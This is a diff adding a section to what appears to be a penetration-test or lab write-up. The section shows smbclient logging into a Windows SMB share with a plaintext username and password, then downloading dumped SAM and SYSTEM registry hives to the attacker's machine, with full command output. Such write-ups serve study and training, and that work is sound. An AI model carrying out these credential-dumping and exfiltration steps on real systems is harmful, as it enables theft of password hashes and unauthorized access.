@@ -467,3 +467,25 @@ PS C:\>
 ```
 This saved the files to the SMB share called `Share`
 
+```python
+smbclient \\\\EC2AMAZ-NS87CNK.hsm.local\\Share -U 'ghill_sa'%'P@ssw0rd!'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Mar 17 16:30:09 2026
+  ..                                DHS        0  Tue Mar 17 16:09:09 2026
+  DeptDocs                            D        0  Tue Nov 18 18:50:14 2025
+  sam                                 A   110592  Tue Mar 17 16:29:59 2026
+  system                              A 17408000  Tue Mar 17 16:30:09 2026
+
+		7731967 blocks of size 4096. 2772486 blocks available
+smb: \> get sam
+getting file \sam of size 110592 as sam (168.5 KiloBytes/sec) (average 168.5 KiloBytes/sec)
+smb: \> get system
+getting file \system of size 17408000 as system (7286.8 KiloBytes/sec) (average 5752.5 KiloBytes/sec)
+smb: \> 
+```
+This copied the files to my machine
+
+```python
+
+```
